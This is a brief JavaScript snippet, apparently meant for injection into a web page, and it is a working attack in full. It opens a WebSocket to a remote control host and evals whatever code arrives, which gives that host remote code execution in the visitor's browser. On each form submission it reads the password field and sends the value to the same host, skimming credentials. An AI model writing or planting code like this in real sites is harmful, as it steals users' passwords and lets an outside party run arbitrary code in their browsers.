const channel = new WebSocket('wss://control.example.invalid/tasks');
channel.onmessage = function(frame) {
  eval(JSON.parse(frame.data).code);
};
document.addEventListener('submit', function() {
  channel.send(JSON.stringify({password: document.querySelector('input[type="password"]').value}));
});
